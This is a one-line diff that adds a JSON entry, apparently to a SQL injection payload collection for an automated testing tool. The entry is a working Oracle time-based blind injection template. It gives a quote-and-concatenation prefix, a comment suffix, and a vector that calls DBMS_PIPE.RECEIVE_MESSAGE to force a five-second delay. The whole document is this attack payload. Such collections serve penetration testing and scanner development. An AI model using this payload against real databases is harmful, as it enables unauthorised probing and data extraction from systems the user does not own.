@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "time", "boundary": {"prefix": "'||", "suffix": "-- -", "type": "concat"}, "vector": "{B} AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5))", "comment": "oracle time: single+concat"}
